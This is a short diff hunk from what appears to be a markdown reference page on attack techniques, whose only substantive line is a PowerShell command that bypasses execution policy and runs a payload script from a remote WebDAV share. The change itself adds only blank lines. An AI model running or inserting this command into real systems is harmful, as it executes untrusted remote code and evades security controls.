@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:07.846486+00:00'
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
+
+
